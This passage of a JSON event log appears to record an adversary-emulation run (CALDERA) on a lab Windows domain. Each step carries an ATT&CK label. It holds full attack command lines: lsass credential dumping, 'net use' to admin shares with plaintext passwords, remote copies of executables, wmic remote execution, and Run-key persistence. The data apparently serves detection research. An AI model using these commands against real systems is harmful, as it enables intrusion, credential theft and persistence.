"santilli-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:01:38.013000+00:00", "actor_pid": 3856, "happened_after": "2017-05-01T19:01:26.695000+00:00", "nodetype": "event", "object": "process", "host": "santilli-pc.brawlco.com", "id": "60569aad-ce0f-4c5d-9549-614bff6c7185"}, {"nodetype": "step", "events": ["f96f2192-299a-4640-a753-020617bbe8c7", "60569aad-ce0f-4c5d-9549-614bff6c7185"], "id": "971030e4-560b-4af7-8fff-0d2d2b7f05b6", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "id": "7ed3a7e5-4131-483a-a0e8-0ccd655b2c84", "pid": 3528, "happened_before": "2017-05-01T19:01:41.278000+00:00", "happened_after": "2017-05-01T19:01:41.114000+00:00", "nodetype": "event", "object": "process", "ppid": 4004, "host": "santilli-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\born.exe /f"}, {"action": "add", "data": "C:\\born.exe", "id": "ff68ab8c-46e0-4262-890e-0c1fcfa853ed", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:01:41.798000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:01:41.020000+00:00", "nodetype": "event", "object": "registry", "host": "santilli-pc.brawlco.com", "fqdn": "santilli-pc.brawlco.com"}, {"nodetype": "step", "events": ["7ed3a7e5-4131-483a-a0e8-0ccd655b2c84", "ff68ab8c-46e0-4262-890e-0c1fcfa853ed"], "id": "af2ece44-a2e5-4d90-b12a-03969640896f", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "32bc7188-9129-42fd-8f12-e0f940e6345e", "pid": 1196, "happened_before": "2017-05-01T19:01:43.948000+00:00", "happened_after": "2017-05-01T19:01:43.795000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "net use \\\\escue-pc.brawlco.com\\C$ ]7s%X.nGkD /user:brawlco\\rescue"}, {"nodetype": "step", "events": ["32bc7188-9129-42fd-8f12-e0f940e6345e"], "id": "cfa811be-5957-4fdf-b230-f7dc810e66d3", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "e7e9e088-5d9c-4e69-ae6b-1e8be2793bdd", "pid": 3068, "happened_before": "2017-05-01T19:01:46.530000+00:00", "happened_after": "2017-05-01T19:01:46.222000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\raised.exe\" \"\\\\escue-pc.brawlco.com\\C$\\born.exe\""}, {"action": "create", "fqdn": "escue-pc.brawlco.com", "file_path": "C:\\born.exe", "happened_before": "2017-05-01T19:01:46.868000+00:00", "happened_after": "2017-05-01T19:01:46.115000+00:00", "nodetype": "event", "object": "file", "host": "escue-pc.brawlco.com", "id": "5bbcd6a0-faec-4d2e-8cec-5fe17a0ec4bb"}, {"nodetype": "step", "events": ["e7e9e088-5d9c-4e69-ae6b-1e8be2793bdd", "5bbcd6a0-faec-4d2e-8cec-5fe17a0ec4bb"], "id": "e4677283-b561-40da-97e1-f49f780fd5c6", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "97f914c6-a2ae-4dc0-891e-c0b461622724", "pid": 2720, "happened_before": "2017-05-01T19:01:48.104000+00:00", "happened_after": "2017-05-01T19:01:47.601000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "wmic /node:\"escue-pc.brawlco.com\" /user:\"brawlco\\rescue\" /password:\"]7s%X.nGkD\" process call create \"C:\\born.exe -d -f\""}, {"nodetype": "step", "events": ["97f914c6-a2ae-4dc0-891e-c0b461622724"], "id": "492e750e-b343-4c3b-9cfe-6c5b2072f3c7", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "escue-pc.brawlco.com", "id": "08dea7df-4d2d-4cee-b079-a09179129aa2", "pid": 3288, "happened_before": "2017-05-01T19:02:09.241000+00:00", "happened_after": "2017-05-01T19:01:51.463000+00:00", "nodetype": "event", "object": "process", "ppid": 2108, "host": "escue-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "escue-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:02:09.241000+00:00", "actor_pid": 3288, "happened_after": "2017-05-01T19:01:51.464000+00:00", "nodetype": "event", "object": "process", "host": "escue-pc.brawlco.com", "id": "615e7e78-5873-4531-829b-9b3b08e6ba6d"}, {"nodetype": "step", "events": ["08dea7df-4d2d-4cee-b079-a09179129aa2", "615e7e78-5873-4531-829b-9b3b08e6ba6d"], "id": "c858d693-0d16-4901-a14e-0610ddd1b7e4", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "escue-pc.brawlco.com", "id": "1106628e-6840-44eb-9dde-3b6674bba339", "pid": 3636, "happened_before": "2017-05-01T19:02:14.553000+00:00", "happened_after": "2017-05-01T19:02:14.386000+00:00", "nodetype": "event", "object": "process", "ppid": 2108, "host": "escue-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\born.exe /f"}, {"action": "add", "data": "C:\\born.exe", "id": "5e9822f5-f1c3-409d-b97f-8b8ceb9f1cb5", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:02:15.189000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:02:14.267000+00:00", "nodetype": "event", "object": "registry", "host": "escue-pc.brawlco.com", "fqdn": "escue-pc.brawlco.com"}, {"nodetype": "step", "events": ["1106628e-6840-44eb-9dde-3b6674bba339", "5e9822f5-f1c3-409d-b97f-8b8ceb9f1cb5"], "id": "b496562e-0463-4b3d-81ad-604026110e2c", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "escue-pc.brawlco.com", "id": "d4b333d0-1f4a-492d-b96f-d3a6b4803b96", "pid": 3092, "happened_before": "2017-05-01T19:02:19.419000+00:00", "happened_after": "2017-05-01T19:02:19.041000+00:00", "nodetype": "event", "object": "process", "ppid": 2108, "host": "escue-pc.brawlco.com", "command_line": "net use \\\\fulco-pc.brawlco.com\\C$ Yr%8AddoYM /user:brawlco\\rfulco"}, {"nodetype": "step", "events": ["d4b333d0-1f4a-492d-b96f-d3a6b4803b96"], "id": "66ef7f1b-56b7-4f61-958a-e5dd2c723f70", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "escue-pc.brawlco.com", "id": "6518838c-0607-439e-b044-e4f1b821f457", "pid": 3052, "happened_before": "2017-05-01T19:02:23.887000+00:00", "happened_after": "2017-05-01T19:02:23.496000+00:00", "nodetype": "event", "object": "process", "ppid": 2108, "host": "escue-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\born.exe\" \"\\\\fulco-pc.brawlco.com\\C$\\born.exe\""}, {"action": "create", "fqdn": "fulco-pc.brawlco.com", "file_path": "C:\\born.exe", "happened_before": "2017-05-01T19:02:24.295000+00:00", "happened_after": "2017-05-01T19:02:23.389000+00:00", "nodetype": "event", "object": "file", "host": "fulco-pc.brawlco.com", "id": "ba9b6480-8642-46d4-be3e-340f7c4728ac"}, {"nodetype": "step", "events": ["6518838c-0607-439e-b044-e4f1b821f457", "ba9b6480-8642-46d4-be3e-340f7c4728ac"], "id": "3d256d32-ab10-4ece-84de-73f3aa82f9f9", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "af4f3e38-63fa-4e5a-9034-1a28569ab543", "pid": 2120, "happened_before": "2017-05-01T19:02:25.606000+00:00", "happened_after": "2017-05-01T19:02:25.230000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "wmic /node:\"fulco-pc.brawlco.com\" /user:\"brawlco\\rfulco\" /password:\"Yr%8AddoYM\" process call create \"C:\\born.exe -d -f\""}, {"nodetype": "step", "events": ["af4f3e38-63fa-4e5a-9034-1a28569ab543"], "id": "8c446093-13da-4fb2-8147-22ca45835f53", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "fulco-pc.brawlco.com", "id": "fa1a3423-a7e1-49e1-b997-46191c93e1f8", "pid": 1884, "happened_before": "2017-05-01T19:02:51.258000+00:00", "happened_after": "2017-05-01T19:02:31.789000+00:00", "nodetype": "event", "object": "process", "ppid": 164, "host": "fulco-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "fulco-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:02:51.258000+00:00", "actor_pid": 1884, "happened_after": "2017-05-01T19:02:31.789000+00:00", "nodetype": "event", "object": "process", "host": "fulco-pc.brawlco.com", "id": "30637c02-4e33-446d-acf7-f2b31859192e"}, {"nodetype": "step", "events": ["fa1a3423-a7e1-49e1-b997-46191c93e1f8", "30637c02-4e33-446d-acf7-f2b31859192e"], "id": "5a7b50bc-2e67-4bb3-a384-5615de59a738", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "fulco-pc.brawlco.com", "id": "e83ca471-1089-4287-8a98-e540654d4b96", "pid": 3488, "happened_before": "2017-05-01T19:03:00.613000+00:00", "happened_after": "2017-05-01T19:02:59.964000+00:00", "nodetype": "event", "object": "process", "ppid": 164, "host": "fulco-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\born.exe /f"}, {"action": "add", "data": "C:\\born.exe", "id": "e018674d-b014-4c3b-8493-c821136d62d9", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:03:01.208000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:02:59.838000+00:00", "nodetype": "event", "object": "registry", "host": "fulco-pc.brawlco.com", "fqdn": "fulco-pc.brawlco.com"}, {"nodetype": "step", "events": ["e83ca471-1089-4287-8a98-e540654d4b96", "e018674d-b014-4c3b-8493-c821136d62d9"], "id": "c6315b9a-f266-47a8-a8b9-f3ce5ae4d43d", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "23b195d7-b275-4780-8d74-0851fa79a5c0", "pid": 1324, "happened_before": "2017-05-01T19:03:08.951000+00:00", "happened_after": "2017-05-01T19:03:08.724000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "net use \\\\teston-pc.brawlco.com\\C$ BYHaF]X7ur /user:brawlco\\cteston"}, {"nodetype": "step", "events": ["23b195d7-b275-4780-8d74-0851fa79a5c0"], "id": "963d4dc6-7108-4f09-a757-31eb9c4fa952", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "814c3a48-1ab8-4f54-8970-034fed2fc43b", "pid": 3888, "happened_before": "2017-05-01T19:03:16.819000+00:00", "happened_after": "2017-05-01T19:03:16.575000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\and.exe\" \"\\\\teston-pc.brawlco.com\\C$\\west.exe\""}, {"action": "create", "fqdn": "teston-pc.brawlco.com", "file_path": "C:\\west.exe", "happened_before": "2017-05-01T19:03:17.236000+00:00", "happened_after": "2017-05-01T19:03:16.460000+00:00", "nodetype": "event", "object": "file", "host": "teston-pc.brawlco.com", "id": "b4a12ed9-58f5-46f4-9bc7-a271ef731ce5"}, {"nodetype": "step", "events": ["814c3a48-1ab8-4f54-8970-034fed2fc43b", "b4a12ed9-58f5-46f4-9bc7-a271ef731ce5"], "id": "e23b85ad-63ea-4dc6-8a47-c0027f6aeb1b", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "8b8686ff-cbed-4f3e-a975-e37b63ab798c", "pid": 3168, "happened_before": "2017-05-01T19:03:19.093000+00:00", "happened_after": "2017-05-01T19:03:18.157000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "wmic /node:\"teston-pc.brawlco.com\" /user:\"brawlco\\cteston\" /password:\"BYHaF]X7ur\" process call create \"C:\\west.exe -d -f\""}, {"nodetype": "step", "events": ["8b8686ff-cbed-4f3e-a975-e37b63ab798c"], "id": "7c9a29ad-9098-4fc6-8395-4372e8c167aa", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "teston-pc.brawlco.com", "id": "1cc79846-5da1-4c81-b97e-fb30f9c88a55", "pid": 1700, "happened_before": "2017-05-01T19:03:41.630000+00:00", "happened_after": "2017-05-01T19:03:29.513000+00:00", "nodetype": "event", "object": "process", "ppid": 928, "host": "teston-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "teston-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:03:41.630000+00:00", "actor_pid": 1700, "happened_after": "2017-05-01T19:03:29.513000+00:00", "nodetype": "event", "object": "process", "host": "teston-pc.brawlco.com", "id": "e2eb586e-6e8f-4239-8a5e-31a16ac76f80"}, {"nodetype": "step", "events": ["1cc79846-5da1-4c81-b97e-fb30f9c88a55", "e2eb586e-6e8f-4239-8a5e-31a16ac76f80"], "id": "a2697bd1-8bbf-4aec-9833-dfa3abd6f9cc", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "teston-pc.brawlco.com", "id": "1f0adda0-7a13-4ae3-afba-0b19f07d6b2e", "pid": 4004, "happened_before": "2017-05-01T19:03:56.220000+00:00", "happened_after": "2017-05-01T19:03:56.028000+00:00", "nodetype": "event", "object": "process", "ppid": 928, "host": "teston-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\west.exe /f"}, {"action": "add", "data": "C:\\west.exe", "id": "9613ff5c-1820-496b-b68a-0e266b04b25e", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:03:56.893000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:03:55.896000+00:00", "nodetype": "event", "object": "registry", "host": "teston-pc.brawlco.com", "fqdn": "teston-pc.brawlco.com"}, {"nodetype": "step", "events": ["1f0adda0-7a13-4ae3-afba-0b19f07d6b2e", "9613ff5c-1820-496b-b68a-0e266b04b25e"], "id": "4e32cb21-6b1c-4087-9f1b-4adeb83f3a23", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "989d8198-3fd2-4f10-95fa-e1aa799fe8e7", "pid": 2188, "happened_before": "2017-05-01T19:04:10.555000+00:00", "happened_after": "2017-05-01T19:04:10.351000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "net use \\\\platten-pc.brawlco.com\\C$ NhEN5tHJ#n /user:brawlco\\aplatten"}, {"nodetype": "step", "events": ["989d8198-3fd2-4f10-95fa-e1aa799fe8e7"], "id": "3756fd70-8941-4008-9772-d0b2ee03fd24", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "b1b62f2b-605b-4137-81e1-0341cd8a56fb", "pid": 3828, "happened_before": "2017-05-01T19:04:24.314000+00:00", "happened_after": "2017-05-01T19:04:24.039000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\born.exe\" \"\\\\platten-pc.brawlco.com\\C$\\and.exe\""}, {"action": "create", "fqdn": "platten-pc.brawlco.com", "file_path": "C:\\and.exe", "happened_before": "2017-05-01T19:04:24.977000+00:00", "happened_after": "2017-05-01T19:04:23.821000+00:00", "nodetype": "event", "object": "file", "host": "platten-pc.brawlco.com", "id": "9a7a831d-64ba-4b62-aa95-faf2ac9318a3"}, {"nodetype": "step", "events": ["b1b62f2b-605b-4137-81e1-0341cd8a56fb", "9a7a831d-64ba-4b62-aa95-faf2ac9318a3"], "id": "7858bd50-440d-47e3-a590-bfa714cc33ef", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "79142ffb-0360-4af2-99e4-eeda9b9613b2", "pid": 3372, "happened_before": "2017-05-01T19:04:26.581000+00:00", "happened_after": "2017-05-01T19:04:26.257000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "wmic /node:\"platten-pc.brawlco.com\" /user:\"brawlco\\aplatten\" /password:\"NhEN5tHJ#n\" process call create \"C:\\and.exe -d -f\""}, {"nodetype": "step", "events": ["79142ffb-0360-4af2-99e4-eeda9b9613b2"], "id": "f6250ad2-6b35-4936-8eb7-747c38f0d143", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "platten-pc.brawlco.com", "id": "31c89334-1747-4914-a82e-d4a780f2b72d", "pid": 2428, "happened_before": "2017-05-01T19:04:55.582000+00:00", "happened_after": "2017-05-01T19:04:44.448000+00:00", "nodetype": "event", "object": "process", "ppid": 3912, "host": "platten-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "platten-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:04:55.582000+00:00", "actor_pid": 2428, "happened_after": "2017-05-01T19:04:44.448000+00:00", "nodetype": "event", "object": "process", "host": "platten-pc.brawlco.com", "id": "55ffd694-0bc5-4e8e-91d1-3df93def737b"}, {"nodetype": "step", "events": ["31c89334-1747-4914-a82e-d4a780f2b72d", "55ffd694-0bc5-4e8e-91d1-3df93def737b"], "id": "579948d5-43f4-4da6-acde-dafa2aadd4d8", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "platten-pc.brawlco.com", "id": "6f2eb1b8-5d21-49c6-832a-6f35494c8461", "pid": 1748, "happened_before": "2017-05-01T19:05:17.881000+00:00", "happened_after": "2017-05-01T19:05:17.681000+00:00", "nodetype": "event", "object": "process", "ppid": 3912, "host": "platten-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\and.exe /f"}, {"action": "add", "data": "C:\\and.exe", "id": "de0aa9af-e419-4b6c-9511-99425599e399", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:05:18.532000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:05:17.548000+00:00", "nodetype": "event", "object": "registry", "host": "platten-pc.brawlco.com", "fqdn": "platten-pc.brawlco.com"}, {"nodetype": "step", "events": ["6f2eb1b8-5d21-49c6-832a-6f35494c8461", "de0aa9af-e419-4b6c-9511-99425599e399"], "id": "701e8324-70c3-4fcf-b4f7-7bae482aec16", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "c13d2de3-318d-421b-8ff0-118ae1dce1f5", "pid": 3344, "happened_before": "2017-05-01T19:05:39.696000+00:00", "happened_after": "2017-05-01T19:05:39.510000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "net use \\\\colgan-pc.brawlco.com\\C$ 8.ax8T34yI /user:brawlco\\scolgan"}, {"nodetype": "step", "events": ["c13d2de3-318d-421b-8ff0-118ae1dce1f5"], "id": "a1ef6558-c66f-409c-b0c8-90017100fbcd", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "9832f3a3-0b1d-4da3-90aa-559e53ffb7da", "pid": 3280, "happened_before": "2017-05-01T19:06:01.720000+00:00", "happened_after": "2017-05-01T19:06:01.524000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\born.exe\" \"\\\\colgan-pc.brawlco.com\\C$\\and.exe\""}, {"action": "create", "fqdn": "colgan-pc.brawlco.com", "file_path": "C:\\and.exe", "happened_before": "2017-05-01T19:06:02.189000+00:00", "happened_after": "2017-05-01T19:06:01.372000+00:00", "nodetype": "event", "object": "file", "host": "colgan-pc.brawlco.com", "id": "72d71255-5686-4934-8702-600e4282a8c4"}, {"nodetype": "step", "events": ["9832f3a3-0b1d-4da3-90aa-559e53ffb7da", "72d71255-5686-4934-8702-600e4282a8c4"], "id": "f35d232c-8076-4e46-84f4-8c21062293d1", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "fulco-pc.brawlco.com", "id": "911d796a-b9fe-4e01-ba1e-afc184436c21", "pid": 2288, "happened_before": "2017-05-01T19:06:04.356000+00:00", "happened_after": "2017-05-01T19:06:03.463000+00:00", "nodetype": "event", "object": "process", "ppid": 164, "host": "fulco-pc.brawlco.com", "command_line": "wmic /node:\"colgan-pc.brawlco.com\" /user:\"brawlco\\scolgan\" /password:\"8.ax8T34yI\" process call create \"C:\\and.exe -d -f\""}, {"nodetype": "step", "events": ["911d796a-b9fe-4e01-ba1e-afc184436c21"], "id": "e5b1c0af-fe6f-4240-9d35-c375f2479c90", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "colgan-pc.brawlco.com", "id": "f0044838-4038-4c7f-89ad-5c94eaac91df", "pid": 824, "happened_before": "2017-05-01T19:06:36.370000+00:00", "happened_after": "2017-05-01T19:06:26.344000+00:00", "nodetype": "event", "object": "process", "ppid": 856, "host": "colgan-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "colgan-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:06:36.370000+00:00", "actor_pid": 824, "happened_after": "2017-05-01T19:06:26.344000+00:00", "nodetype": "event", "object": "process", "host": "colgan-pc.brawlco.com", "id": "85f9b60e-8003-4b18-9559-ff13071dbd5f"}, {"nodetype": "step", "events": ["f0044838-4038-4c7f-89ad-5c94eaac91df", "85f9b60e-8003-4b18-9559-ff13071dbd5f"], "id": "778131e9-ff6f-4024-b7c5-c838a774437d", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "colgan-pc.brawlco.com", "id": "e64a3353-2da8-4e41-ae72-0bd16c7ff1a1", "pid": 2904, "happened_before": "2017-05-01T19:07:00.102000+00:00", "happened_after": "2017-05-01T19:06:59.840000+00:00", "nodetype": "event", "object": "process", "ppid": 856, "host": "colgan-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\and.exe /f"}, {"action": "add", "data": "C:\\and.exe", "id": "65d80ce0-b80a-4739-8a8f-a20e2361b0f1", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:07:00.856000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:06:59.696000+00:00", "nodetype": "event", "object": "registry", "host": "colgan-pc.brawlco.com", "fqdn": "colgan-pc.brawlco.com"}, {"nodetype": "step", "events": ["e64a3353-2da8-4e41-ae72-0bd16c7ff1a1", "65d80ce0-b80a-4739-8a8f-a20e2361b0f1"], "id": "f9db544d-fee7-44ae-b7ab-0a0c8862b907", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "id": "848e198d-8c76-45f5-939b-55f280dfa1bf", "pid": 2424, "happened_before": "2017-05-01T19:07:22.788000+00:00", "happened_after": "2017-05-01T19:07:22.496000+00:00", "nodetype": "event", "object": "process", "ppid": 4004, "host": "santilli-pc.brawlco.com", "command_line": "net use \\\\zissler-pc.brawlco.com\\C$ X#sMtEVe0] /user:brawlco\\szissler"}, {"nodetype": "step", "events": ["848e198d-8c76-45f5-939b-55f280dfa1bf"], "id": "9a68e983-1d65-4806-b907-a96f1118818b", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "id": "1b9c583b-94f8-401c-9152-6eefca77e0c3", "pid": 3952, "happened_before": "2017-05-01T19:07:45.198000+00:00", "happened_after": "2017-05-01T19:07:44.958000+00:00", "nodetype": "event", "object": "process", "ppid": 4004, "host": "santilli-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\born.exe\" \"\\\\zissler-pc.brawlco.com\\C$\\and.exe\""}, {"action": "create", "fqdn": "zissler-pc.brawlco.com", "file_path": "C:\\and.exe", "happened_before": "2017-05-01T19:07:45.722000+00:00", "happened_after": "2017-05-01T19:07:44.793000+00:00", "nodetype": "event", "object": "file", "host": "zissler-pc.brawlco.com", "id": "bfc6b516-607f-482a-b5fb-12e3b6faa414"}, {"nodetype": "step", "events": ["1b9c583b-94f8-401c-9152-6eefca77e0c3", "bfc6b516-607f-482a-b5fb-12e3b6faa414"], "id": "bad8097e-81c9-4a86-9761-3b44b15144d2", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "08156a18-6088-4a6c-b14b-31455ffb50bc", "pid": 3148, "happened_before": "2017-05-01T19:07:47.557000+00:00", "happened_after": "2017-05-01T19:07:47.127000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "wmic /node:\"zissler-pc.brawlco.com\" /user:\"brawlco\\szissler\" /password:\"X#sMtEVe0]\" process call create \"C:\\and.exe -d -f\""}, {"nodetype": "step", "events": ["08156a18-6088-4a6c-b14b-31455ffb50bc"], "id": "d0174c8c-142f-457c-98ba-e7659d782a4f", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "zissler-pc.brawlco.com", "id": "521aaa20-8d0a-44c4-b9d4-da69133bcd9a", "pid": 1644, "happened_before": "2017-05-01T19:08:31.133000+00:00", "happened_after": "2017-05-01T19:08:11.177000+00:00", "nodetype": "event", "object": "process", "ppid": 3388, "host": "zissler-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "zissler-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:08:31.133000+00:00", "actor_pid": 1644, "happened_after": "2017-05-01T19:08:11.178000+00:00", "nodetype": "event", "object": "process", "host": "zissler-pc.brawlco.com", "id": "a9e82dfd-e5ac-4bb0-9139-7369705c14d3"}, {"nodetype": "step", "events": ["521aaa20-8d0a-44c4-b9d4-da69133bcd9a", "a9e82dfd-e5ac-4bb0-9139-7369705c14d3"], "id": "a2e45b18-427b-4a32-aa86-0d293e7360e9", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "zissler-pc.brawlco.com", "id": "f0fcb10a-db9b-4979-8022-d11dce451a2c", "pid": 2524, "happened_before": "2017-05-01T19:08:54.645000+00:00", "happened_after": "2017-05-01T19:08:54.447000+00:00", "nodetype": "event", "object": "process", "ppid": 3388, "host": "zissler-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\and.exe /f"}, {"action": "add", "data": "C:\\and.exe", "id": "3c4f7023-35e1-4371-aad8-57f946112a1a", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:08:55.537000+00:00", "value": "caldera", "happened_after": 